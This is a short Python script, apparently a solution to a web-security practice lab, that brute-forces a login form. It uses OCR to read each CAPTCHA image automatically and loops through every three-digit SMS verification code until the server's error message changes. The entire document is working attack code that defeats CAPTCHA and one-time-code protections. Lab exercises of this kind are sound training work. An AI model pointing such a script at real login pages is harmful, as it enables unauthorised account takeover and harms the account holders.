#!/usr/bin/env python3
# Author: renzongxian
# 验证码爆破
import pytesseract
from PIL import Image
#coding:utf-8
import requests
import os
cur_path = os.getcwd()
vcode_path = os.path.join(cur_path, 'vcode.png')
header = {'Cookie': 'PHPSESSID=$Your Value'}

def vcode():
    pic_url = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'
    r = requests.get(pic_url, headers=header, timeout=10)
    with open(vcode_path, 'wb') as pic:
        pic.write(r.content)
    im = pytesseract.image_to_string(Image.open(vcode_path))
    im = im.replace(' ', '')
    if im != '':
        return im
    else:
        return vcode()

url = 'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php'
for i in range(100, 1000):
    code = vcode()
    data = {'username': '13388886666', 'mobi_code': str(i), 'user_code': code}
    r = requests.post(url, data=data, headers=header, timeout=10)
    response = r.content.decode('utf-8')
    if 'user_code or mobi_code error' in response:
        print('trying ' + str(i))
    else:
        print('the mobi_code is ' + str(i))
        print(response)
        break